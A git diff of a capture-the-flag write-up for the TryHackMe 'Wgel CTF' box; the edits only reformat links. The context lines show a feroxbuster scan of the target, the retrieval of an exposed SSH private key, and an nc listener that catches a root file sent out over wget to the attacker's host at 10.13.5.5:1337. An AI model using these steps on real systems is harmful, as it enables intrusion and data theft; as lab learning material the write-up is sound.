@@ -62,8 +62,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 $ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x html,js,sh -o port_80.txt -u http://10.10.99.204
 ```
 \
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/web/port_80.bash)
-\
+[FeroxBuster File](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/web/port_80.bash)
 
 4. We find that there is a `server misconfiguration` in place allowing us to read a `ssh key` from the subdomain at `/sitemap/.ssh/id_rsa`. The key can be seen [here](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/web/sitemap/%2Essh/id_rsa)
 
@@ -134,7 +133,7 @@ Connecting to 10.13.5.5:1337... connected.
 HTTP request sent, awaiting response... 
 No data received.
 ```
-\
+
 ```bash
 ┌──(kali㉿kali)-[~/…/Try_Hack_Me/Wgel CTF/ssh/root]
 └─$ nc -lnvvp 1337 > root.txt
